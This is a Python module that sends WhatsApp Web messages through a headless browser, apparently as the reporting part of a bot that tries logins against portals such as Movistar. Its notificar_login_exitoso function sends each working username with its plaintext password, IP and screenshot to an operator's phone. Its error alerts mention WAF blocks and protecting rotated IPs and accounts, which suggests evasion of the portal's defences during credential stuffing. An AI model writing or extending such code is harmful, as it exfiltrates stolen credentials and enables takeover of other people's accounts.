"""
Módulo de Notificaciones WhatsApp (whatsapp_notifier.py)
=========================================================
Proporciona métodos reutilizables para enviar alertas, mensajes de texto
y notificaciones de login exitoso a través de WhatsApp Web utilizando
la sesión autenticada con configurarwhatsapp.py.

Uso:
  from whatsapp_notifier import enviar_whatsapp, notificar_login_exitoso, notificar_resumen
  
  # Enviar texto simple:
  enviar_whatsapp("Hola, prueba desde bot")
  
  # Notificar un login:
  notificar_login_exitoso(usuario="juan", contrasena="123", portal="Teletrabajo")
"""

import os
import sys
import time
import json
import logging
import threading
import urllib.parse
from pathlib import Path
from typing import Optional, Dict


# Rutas del módulo WhatsApp
PROJECT_DIR = Path(__file__).parent
DATAWP_DIR = PROJECT_DIR / "datawp"
SESSION_DIR = DATAWP_DIR / "whatsapp_session"
CONFIG_FILE = DATAWP_DIR / "whatsapp_config.json"


logger = logging.getLogger("WhatsAppNotifier")

# Motor de Navegador
try:
    from patchright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    HAS_BROWSER = True
except ImportError:
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
        HAS_BROWSER = True
    except ImportError:
        HAS_BROWSER = False


def esta_configurado() -> bool:
    """Verifica si WhatsApp ha sido configurado previamente con número y sesión."""
    if not CONFIG_FILE.exists() or not SESSION_DIR.exists():
        return False
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            cfg = json.load(f)
            return bool(cfg.get("numero_destino")) and cfg.get("activo", True)
    except Exception:
        return False


def obtener_numero_destino() -> Optional[str]:
    """Obtiene el número destino desde data/whatsapp_config.json."""
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                return cfg.get("numero_destino")
        except Exception:
            pass
    return None


_wa_lock = threading.Lock()


def enviar_whatsapp(
    mensaje: str,
    numero: Optional[str] = None,
    imagen_path: Optional[str] = None,
    timeout_s: int = 40
) -> bool:
    """
    Envía un mensaje de WhatsApp al número especificado (o al guardado por defecto).
    """
    if not HAS_BROWSER:
        logger.error("Playwright / Patchright no está disponible para enviar WhatsApp.")
        return False

    dest_num = numero or obtener_numero_destino()
    if not dest_num:
        logger.warning("No hay número de WhatsApp configurado. Ejecute 'python configurarwhatsapp.py'.")
        return False

    if not SESSION_DIR.exists():
        logger.warning(f"No existe sesión en {SESSION_DIR}. Ejecute 'python configurarwhatsapp.py'.")
        return False

    with _wa_lock:
        try:
            with sync_playwright() as p:
                browser_context = p.chromium.launch_persistent_context(
                    user_data_dir=str(SESSION_DIR),
                    headless=True,
                    viewport={"width": 1280, "height": 800},
                    args=["--no-sandbox", "--disable-dev-shm-usage"]
                )

                page = browser_context.pages[0] if browser_context.pages else browser_context.new_page()

                url_send = f"https://web.whatsapp.com/send?phone={dest_num}&text={urllib.parse.quote(mensaje)}"
                page.goto(url_send, wait_until="domcontentloaded", timeout=timeout_s * 1000)

                # Esperar a que cargue el chat
                time.sleep(4)

                # Si hay imagen para adjuntar
                if imagen_path and os.path.exists(imagen_path):
                    try:
                        # Clic en botón de adjuntar (+)
                        attach_btn = page.locator('div[title="Adjuntar"], span[data-icon="plus"]').first
                        if attach_btn.is_visible():
                            attach_btn.click()
                            time.sleep(1)
                            # Input de archivo
                            file_input = page.locator('input[accept*="image"]').first
                            file_input.set_input_files(imagen_path)
                            time.sleep(2)
                            # Botón enviar en vista previa de imagen
                            send_img_btn = page.locator('span[data-icon="send"]').first
                            if send_img_btn.is_visible():
                                send_img_btn.click()
                                time.sleep(3)
                                browser_context.close()
                                logger.info(f"✅ Mensaje con imagen enviado por WhatsApp a +{dest_num}")
                                return True
                    except Exception as e_img:
                        logger.warning(f"Error adjuntando imagen ({e_img}), enviando solo texto...")

                # Enviar mensaje de texto
                send_btn = page.locator('span[data-icon="send"]').first
                if send_btn.is_visible():
                    send_btn.click()
                else:
                    page.keyboard.press("Enter")

                time.sleep(3)
                browser_context.close()
                logger.info(f"✅ Mensaje enviado por WhatsApp a +{dest_num}")
                return True

        except Exception as e:
            logger.error(f"Error enviando WhatsApp: {e}")
            return False



def notificar_login_exitoso(
    usuario: str,
    contrasena: str,
    portal: str = "Visor Clientes",
    procedencia: str = "Interno",
    ip: str = "N/A",
    screenshot_path: Optional[str] = None
) -> bool:
    """Envía notificación formateada de credencial exitosa."""
    ahora = time.strftime("%Y-%m-%d %H:%M:%S")
    mensaje = (
        f"🎉 *¡LOGIN EXITOSO DETECTADO!*\n\n"
        f"📌 *Portal:* {portal}\n"
        f"👤 *Usuario:* `{usuario}`\n"
        f"🔑 *Contraseña:* `{contrasena}`\n"
        f"🏷️ *Procedencia:* {procedencia}\n"
        f"🌐 *IP:* {ip}\n"
        f"⏰ *Hora:* {ahora}\n"
    )
    return enviar_whatsapp(mensaje, imagen_path=screenshot_path)


def notificar_resumen(
    total: int,
    exitosos: int,
    fallidos: int,
    duracion: str,
    portal: str = "Movistar"
) -> bool:
    """Envía un resumen al finalizar la ejecución del bot."""
    mensaje = (
        f"📊 *RESUMEN DE EJECUCIÓN - {portal.upper()}*\n\n"
        f"🔢 *Total Pruebas:* {total}\n"
        f"✅ *Exitosos:* {exitosos}\n"
        f"❌ *Fallidos:* {fallidos}\n"
        f"⏱️ *Duración:* {duracion}\n"
        f"📅 *Fecha:* {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    )
    return enviar_whatsapp(mensaje)


def notificar_error_critico(
    portal: str,
    motivo: str,
    detalle: str,
    tarea_actual: Optional[Dict] = None,
    tareas_restantes: int = 0
) -> bool:
    """
    Envía notificación de error crítico cuando se detecta:
    - 2 WAF consecutivos
    - 2 pantallas en blanco consecutivas
    - 2 demoras excesivas / timeouts consecutivos
    """
    ahora = time.strftime("%Y-%m-%d %H:%M:%S")
    mensaje = (
        f"🚨 *ALERTA: ERROR CRÍTICO DETECTADO*\n\n"
        f"📌 *Portal:* {portal}\n"
        f"⚠️ *Motivo:* {motivo}\n"
        f"🔍 *Detalle:* {detalle}\n"
    )
    if tarea_actual:
        u_val = tarea_actual.get("usuario") or tarea_actual.get("u", "N/A")
        proc_val = tarea_actual.get("procedencia") or tarea_actual.get("t", "N/A")
        ip_val = tarea_actual.get("ip", "N/A")
        mensaje += (
            f"👤 *Usuario afectado:* `{u_val}` ({proc_val})\n"
            f"🌐 *IP:* {ip_val}\n"
        )
    mensaje += (
        f"📊 *Tareas restantes guardadas en memoria:* {tareas_restantes}\n"
        f"⏰ *Hora:* {ahora}\n\n"
        f"⏸️ *La ejecución se ha pausado para proteger las IPs y cuentas.*\n"
        f"💡 Puede reanudar la ejecución desde `python ejecutar.py`."
    )
    return enviar_whatsapp(mensaje)



# ============================================================
# CLASE DE COMPATIBILIDAD CON CÓDIGO PREVIO
# ============================================================
class WhatsAppNotifier:
    """Clase wrapper para mantener compatibilidad con main.py y otros módulos."""

    def __init__(self, bridge_port: int = 3456, whatsapp_module_dir: str = None):
        self.activo = esta_configurado()
        self.bridge_process = None

    def notify_login(self, procedencia: str, usuario: str, contraseña: str,
                     screenshot: str = None, ip: str = "N/A") -> bool:
        return notificar_login_exitoso(
            usuario=usuario,
            contrasena=contraseña,
            procedencia=procedencia,
            ip=ip,
            screenshot_path=screenshot
        )

    def notify_summary(self, total: int, exitosos: int, fallidos: int, duration: str) -> bool:
        return notificar_resumen(
            total=total,
            exitosos=exitosos,
            fallidos=fallidos,
            duracion=duration
        )

    def stop_bridge(self):
        pass


if __name__ == "__main__":
    if esta_configurado():
        print(f"✅ WhatsApp configurado con número: +{obtener_numero_destino()}")
        enviar_whatsapp("🔔 Prueba de envío desde whatsapp_notifier.py")
    else:
        print("⚠️ WhatsApp no configurado. Ejecute: python configurarwhatsapp.py")
